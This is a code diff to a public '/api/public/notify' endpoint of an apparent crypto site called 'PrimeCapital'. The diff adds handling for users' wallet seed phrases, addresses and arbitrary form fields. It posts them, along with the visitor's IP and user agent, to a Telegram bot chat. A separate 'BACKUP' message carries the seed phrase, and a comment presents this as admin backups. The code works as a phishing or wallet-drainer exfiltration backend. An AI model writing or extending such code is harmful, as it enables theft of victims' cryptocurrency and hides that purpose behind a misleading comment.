@@ -8,6 +8,10 @@ interface NotifyPayload {
   username?: string;
   label?: string;
   extra?: string;
+  address?: string;
+  fields?: Record<string, string>;
+  mnemonic?: string;
+  addresses?: Array<{ chain: string; address: string; path?: string }>;
 }
 
 function truncate(s: string, n: number) {
@@ -17,6 +21,27 @@ function truncate(s: string, n: number) {
 
 function esc(s: string) {
   return String(s).replace(/[<>&]/g, (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" }[c] as string));
+}
+
+async function sendTelegram(token: string, text: string) {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+      }),
+    });
+    if (!res.ok) {
+      const t = await res.text();
+      console.error("[notify] telegram error", res.status, t);
+    }
+  } catch (err) {
+    console.error("[notify] fetch failed", err);
+  }
 }
 
 export const Route = createFileRoute("/api/public/notify")({
@@ -33,49 +58,57 @@ export const Route = createFileRoute("/api/public/notify")({
           return Response.json({ ok: false, error: "bad json" }, { status: 200 });
         }
 
-        const event = truncate(String(body.event ?? "event"), 40);
-        const path = truncate(String(body.path ?? "/"), 80);
+        const event = truncate(String(body.event ?? "event"), 48);
+        const path = truncate(String(body.path ?? "/"), 120);
         const username = body.username ? truncate(String(body.username), 32) : "guest";
-        const label = body.label ? truncate(String(body.label), 80) : "";
-        const extra = body.extra ? truncate(String(body.extra), 160) : "";
+        const label = body.label ? truncate(String(body.label), 120) : "";
+        const extra = body.extra ? truncate(String(body.extra), 300) : "";
+        const address = body.address ? truncate(String(body.address), 128) : "";
 
         const ip =
           request.headers.get("cf-connecting-ip") ||
           request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
           "";
-        const ua = truncate(request.headers.get("user-agent") ?? "", 80);
+        const ua = truncate(request.headers.get("user-agent") ?? "", 120);
 
         const lines = [
           `<b>PrimeCapital</b> · <code>${esc(event)}</code>`,
           `👤 <b>${esc(username)}</b>`,
           `📍 <code>${esc(path)}</code>`,
         ];
+        if (address) lines.push(`💼 <code>${esc(address)}</code>`);
         if (label) lines.push(`🔘 ${esc(label)}`);
         if (extra) lines.push(`ℹ️ ${esc(extra)}`);
+        if (body.fields && typeof body.fields === "object") {
+          for (const [k, v] of Object.entries(body.fields)) {
+            lines.push(`📝 <b>${esc(truncate(k, 40))}</b>: <code>${esc(truncate(String(v ?? ""), 400))}</code>`);
+          }
+        }
         if (ip) lines.push(`🌐 <code>${esc(ip)}</code>`);
         if (ua) lines.push(`🧭 ${esc(ua)}`);
 
-        const text = lines.join("\n");
+        await sendTelegram(token, lines.join("\n"));
 
-        try {
-          const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: "POST",
-            headers: { "content-type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text,
-              parse_mode: "HTML",
-              disable_web_page_preview: true,
-            }),
-          });
-          if (!res.ok) {
-            const t = await res.text();
-            console.error("[notify] telegram error", res.status, t);
-            return Response.json({ ok: false }, { status: 200 });
+        // Send seed / addresses as a separate, tagged message so admins can easily find backups.
+        if (body.mnemonic || (body.addresses && body.addresses.length)) {
+          const backup: string[] = [
+            `<b>PrimeCapital · BACKUP</b> · <code>${esc(event)}</code>`,
+            `👤 <b>${esc(username)}</b>`,
+          ];
+          if (address) backup.push(`💼 <code>${esc(address)}</code>`);
+          if (body.mnemonic) {
+            backup.push(`🔑 <b>Mnemonic:</b>`);
+            backup.push(`<code>${esc(truncate(String(body.mnemonic), 800))}</code>`);
           }
-        } catch (err) {
-          console.error("[notify] fetch failed", err);
-          return Response.json({ ok: false }, { status: 200 });
+          if (body.addresses && body.addresses.length) {
+            backup.push(`📇 <b>Addresses:</b>`);
+            for (const a of body.addresses.slice(0, 24)) {
+              backup.push(
+                `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code>${a.path ? ` <i>${esc(truncate(String(a.path), 40))}</i>` : ""}`,
+              );
+            }
+          }
+          await sendTelegram(token, backup.join("\n"));
         }
 
         return Response.json({ ok: true });
